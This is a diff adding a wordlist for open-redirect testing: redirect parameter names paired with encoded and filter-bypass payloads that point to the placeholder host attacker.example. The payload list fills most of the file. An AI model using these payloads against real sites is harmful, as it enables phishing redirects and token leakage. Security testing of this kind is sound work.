@@ -1,0 +1,45 @@
+# Common open-redirect parameter names (try both query and fragment)
+path
+url
+next
+redirect
+redir
+return
+returnUrl
+continue
+dest
+destination
+forward
+to
+target
+go
+out
+link
+page
+u
+r
+
+# Payloads (pair with params above)
+/ //attacker.example/
+//attacker.example/
+https://attacker.example/
+https:%2f%2fattacker.example%2f
+%2f%2fattacker.example%2f
+%2F%2Fattacker.example%2F
+//attacker.example/after
+/\attacker.example/
+///attacker.example/
+
+# Application-internal pivots
+/post/next?path=https://attacker.example/
+/redirect?url=https://attacker.example/
+/login?next=https://attacker.example/
+
+# Encoded and double-encoded
+https:%252f%252fattacker.example%252f
+%252f%252fattacker.example%252f
+
+# Open-redirect testers (should land on attacker)
+/?url=https://attacker.example/
+/?next=https://attacker.example/
+/?redirect=https://attacker.example/
